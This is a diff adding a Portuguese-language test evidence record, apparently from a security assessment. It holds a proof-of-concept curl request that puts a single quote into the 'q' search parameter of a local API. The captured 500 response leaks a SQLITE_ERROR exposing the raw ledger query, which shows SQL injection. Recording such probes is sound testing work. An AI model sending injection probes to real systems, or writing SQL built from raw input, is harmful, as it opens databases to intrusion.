@@ -1,0 +1,20 @@
+# E4 — E4-02-poc-single-quote: PoC — aspa simples (%27) no parâmetro q
+capturado_em : 2026-11-04T12:59:04.863Z
+duracao_ms   : 1
+expectativa  : Erro genérico SEM estrutura da consulta; 500 com SQLITE_ERROR se vulnerável.
+
+$ curl -s -i "http://127.0.0.1:35021/api/v1/search?q=%27"
+
+>>> REQUISICAO
+GET /api/v1/search?q=%27 HTTP/1.1
+Host: 127.0.0.1:35021
+
+<<< RESPOSTA
+HTTP/1.1 500 Internal Server Error
+connection: keep-alive
+content-type: text/plain; charset=utf-8
+date: Wed, 04 Nov 2026 12:59:04 GMT
+keep-alive: timeout=5
+transfer-encoding: chunked
+
+SQLITE_ERROR: near "'": syntax error in SELECT id, amount FROM ledger WHERE memo LIKE '%'%'
